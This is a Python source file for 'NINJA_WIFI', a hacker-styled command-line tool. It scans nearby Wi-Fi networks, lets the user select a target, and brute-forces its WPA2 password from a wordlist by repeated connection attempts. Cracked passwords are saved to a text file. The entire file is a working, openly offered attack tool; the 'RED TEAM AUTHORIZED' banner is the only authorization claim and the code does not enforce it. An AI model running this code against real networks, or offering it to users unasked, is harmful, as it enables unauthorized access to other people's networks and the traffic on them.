import pywifi
from pywifi import const
import time
import os
import sys
import shutil

# ANSI color codes for Ninja Style
RED = "\033[91m"
BLUE = "\033[94m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
WHITE = "\033[97m"
PURPLE = "\033[95m"
RESET = "\033[0m"

# Global variables
selected_ssid = None
selected_bssid = None
selected_signal = None
wordlist_path = "wordlist.txt"
password_found = False
found_password = None

def print_banner(full=True):
    """ Prints a Ninja-style banner for Cyber Ninja """
    os.system("cls" if os.name == "nt" else "clear")
    terminal_width = shutil.get_terminal_size().columns

    # NEW EXCLUSIVE NINJA_WIFI BANNER
    banner = [
        f"{RED}      ███╗   ██╗██╗███╗   ██╗      ██╗ █████╗     ██╗    ██╗██╗███████╗██╗ {RESET}",
        f"{RED}      ████╗  ██║██║████╗  ██║      ██║██╔══██╗    ██║    ██║██║██╔════╝██║ {RESET}",
        f"{WHITE}      ██╔██╗ ██║██║██╔██╗ ██║      ██║███████║    ██║ █╗ ██║██║█████╗  ██║ {RESET}",
        f"{WHITE}      ██║╚██╗██║██║██║╚██╗██║ ██   ██║██╔══██║    ██║███╗██║██║██╔══╝  ██║ {RESET}",
        f"{RED}      ██║ ╚████║██║██║ ╚████║ ╚█████╔╝██║  ██║    ╚███╔███╔╝██║██║     ██║ {RESET}",
        f"{RED}      ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝  ╚════╝ ╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝ {RESET}",
        f"{YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}",
        f"{CYAN}   [>] TOOL NAME : NINJA_WIFI          [>] VERSION : 2.0 (2026 Edition){RESET}",
        f"{CYAN}   [>] DEVELOPER : CYBER NINJA         [>] STATUS  : RED TEAM AUTHORIZED{RESET}",
        f"{GREEN}   [>] YOUTUBE   : https://www.youtube.com/@nobodyerror-q7w2n{RESET}",
        f"{GREEN}   [>] INSTAGRAM : https://www.instagram.com/cyberninja200/{RESET}",
        f"{YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}"
    ]

    for line in banner:
        print(line.center(terminal_width))

    if full and selected_ssid:
        print(f"\n{PURPLE}Target Locked: {selected_ssid} ({selected_bssid}) | Signal: {selected_signal}%{RESET}".center(terminal_width))
        print(f"{PURPLE}Wordlist: {wordlist_path}{RESET}".center(terminal_width))
        print(f"{YELLOW}----------------------------------------------------------------------------------{RESET}".center(terminal_width))

def scan_for_networks():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    print(f"\n{CYAN}[+] Ninja is scanning airwaves...{RESET}", end="")
    iface.scan()
    time.sleep(4)
    networks = iface.scan_results()
    wifi_list = []

    if not networks:
        print(f"\n{RED}[-] No signals detected. Are you in range?{RESET}")
        return []

    print(f"\n{YELLOW}Available Target Networks:{RESET}")
    for i, network in enumerate(networks):
        ssid = network.ssid if network.ssid else "Hidden_SSID"
        signal = network.signal
        wifi_list.append((ssid, network.bssid, signal))
        print(f" {CYAN}[{i + 1}] {ssid.ljust(25)} {YELLOW}Signal: {signal}% {GREEN}BSSID: ({network.bssid}){RESET}")
    return wifi_list

def select_network():
    global selected_ssid, selected_bssid, selected_signal
    wifi_list = scan_for_networks()
    if not wifi_list: return

    while True:
        try:
            choice = int(input(f"\n{YELLOW}[?] Select Target Number (0 to Rescan): {RESET}"))
            if choice == 0:
                select_network()
                return
            elif 1 <= choice <= len(wifi_list):
                selected_ssid, selected_bssid, selected_signal = wifi_list[choice - 1]
                break
            else:
                print(f"{RED}[-] Target out of range.{RESET}")
        except ValueError:
            print(f"{RED}[-] Invalid input.{RESET}")
    print_banner(full=True)

def select_wordlist():
    global wordlist_path
    new_path = input(f"{YELLOW}[?] Drag & Drop Wordlist or Enter Path: {RESET}").strip()
    if os.path.exists(new_path):
        wordlist_path = os.path.abspath(new_path)
        print(f"{GREEN}[+] Arsenal updated with new wordlist.{RESET}")
    else:
        print(f"{RED}[-] Wordlist not found.{RESET}")
    time.sleep(1)
    print_banner(full=True)

def connect_to_wifi(password):
    try:
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.disconnect()
        time.sleep(1)
        
        profile = pywifi.Profile()
        profile.ssid = selected_ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        iface.remove_all_network_profiles()
        temp_profile = iface.add_network_profile(profile)
        iface.connect(temp_profile)
        time.sleep(3)
        
        if iface.status() == const.IFACE_CONNECTED:
            with open(f"Ninja_Crack_{selected_ssid}.txt", "w") as f:
                f.write(f"SSID: {selected_ssid}\nPassword: {password}")
            return True
        return False
    except Exception as e:
        return False

def brute_force_attack():
    global selected_ssid, wordlist_path
    if not selected_ssid:
        print(f"{RED}[-] Select a target first!{RESET}")
        return
    if not os.path.exists(wordlist_path):
        print(f"{RED}[-] Wordlist missing!{RESET}")
        return

    print(f"\n{CYAN}[+] Initiating Ninja_WIFI Bruteforce on: {selected_ssid}{RESET}")
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as wordlist:
            for password in wordlist:
                password = password.strip()
                if not password: continue
                print(f"\r{YELLOW}[*] Testing: {password.ljust(20)}{RESET}", end="", flush=True)
                if connect_to_wifi(password):
                    print(f"\n\n{GREEN}[SUCCESS] NINJA CRACKED IT!{RESET}")
                    print(f"{GREEN}[+] PASSWORD FOUND: {password}{RESET}")
                    return
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Attack aborted by Ninja.{RESET}")
    print(f"\n{RED}[-] All passwords tested. No luck this time.{RESET}")

def show_help():
    cmds = {
        "scan": "Scan available WiFi",
        "attack": "Start cracking",
        "change target": "Pick another network",
        "change wordlist": "Use different password file",
        "clear": "Clean screen",
        "exit": "Shut down tool"
    }
    print(f"\n{YELLOW}NINJA COMMANDS:{RESET}")
    for c, d in cmds.items():
        print(f"{CYAN}{c.ljust(18)}{RESET} - {d}")

def menu():
    print_banner()
    while True:
        try:
            cmd = input(f"\n{RED}ninja_wifi# {RESET}").strip().lower()
            if cmd == "scan": select_network()
            elif cmd == "attack": brute_force_attack()
            elif cmd == "change target": select_network()
            elif cmd == "change wordlist": select_wordlist()
            elif cmd == "clear" or cmd == "cls": print_banner()
            elif cmd == "help": show_help()
            elif cmd == "exit": sys.exit()
            else: print(f"{RED}[!] Unknown command. Type 'help'.{RESET}")
        except KeyboardInterrupt:
            sys.exit()

if __name__ == "__main__":
    menu()
